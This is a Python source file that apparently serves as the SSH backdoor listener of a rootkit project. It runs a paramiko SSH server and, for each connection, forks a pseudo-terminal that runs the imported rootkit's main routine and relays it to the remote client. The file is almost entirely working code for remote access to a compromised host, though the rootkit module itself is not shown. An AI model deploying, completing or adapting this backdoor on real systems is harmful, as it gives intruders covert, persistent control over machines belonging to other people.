"""Server, socket-wise"""

# pylint: disable=broad-exception-caught

import traceback
import threading
import socket
import sys
import pty
import select
import os
import paramiko
from .ssh import SshServerInterface
from .rootkit import main as rootkit_main


class SshServer:
    """Socket server class"""

    def __init__(self, host_key_file: str) -> None:
        self._is_running = threading.Event()
        self._socket: socket.socket | None = None
        self._listen_thread: threading.Thread | None = None

        self._host_key = paramiko.ed25519key.Ed25519Key.from_private_key_file(
            host_key_file, None
        )

    def start(
        self, address: str = "127.0.0.1", port: int = 22, timeout: int = 1
    ) -> None:
        """Constructs the socket and launches listening thread"""
        assert not self._is_running.is_set()
        self._is_running.set()

        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)

        # reuse port is not avaible on windows
        if sys.platform in ["linux", "linux2"]:
            self._socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, True)

        self._socket.settimeout(timeout)
        self._socket.bind((address, port))

        self._listen_thread = threading.Thread(target=self._listen)
        self._listen_thread.start()

    def stop(self) -> None:
        """Stops the listening thread"""
        assert self._is_running.is_set()
        assert self._listen_thread is not None
        assert self._socket is not None
        self._is_running.clear()
        self._listen_thread.join()
        self._socket.close()

    def _listen(self) -> None:
        """Listening function"""
        assert self._socket is not None
        self._socket.listen()
        while self._is_running.is_set():
            # This is terrible and can handle up to 1 connection at a time
            try:
                client, _addr = self._socket.accept()

                # Apparently paramiko can't handle non-blocking sockets during
                # handshake, so I can't use epoll here. I'm doing accept-and-fork
                # for now in lack of a better option. I doubt this gets enough
                # attention as to need anything else.
                threading.Thread(
                    target=self.connection_function, args=(client,)
                ).start()
            except TimeoutError:
                pass
            except Exception:
                print("--- AN EXCEPTION HAS OCCURRED: listen ---")
                traceback.print_exc()

    def connection_function(self, client: socket.socket) -> None:
        """Connection handler"""
        try:
            session = paramiko.Transport(client)
            session.add_server_key(self._host_key)
            server = SshServerInterface()
            try:
                session.start_server(server=server)
            except paramiko.SSHException:
                return

            channel = session.accept()
            if channel is None:
                return

            pid, fd = pty.fork()
            if pid == 0:
                rootkit_main.main()
                session.close()
                sys.exit()

            # Parent thread
            while True:
                # select is not the most efficient thing out there but
                # it surely is fine for now
                rlist, _wlist, _xlist = select.select([fd, channel], [], [])

                if fd in rlist:
                    try:
                        data = os.read(fd, 1024)
                    except socket.error:
                        break
                    if len(data) == 0:
                        break
                    channel.send(data)

                if channel in rlist:
                    if channel.recv_ready():
                        data = channel.recv(1024)
                        if len(data) == 0:
                            break
                        os.write(fd, data)
            session.close()
        except:
            print("--- AN EXCEPTION HAS OCCURRED: connection_function ---")
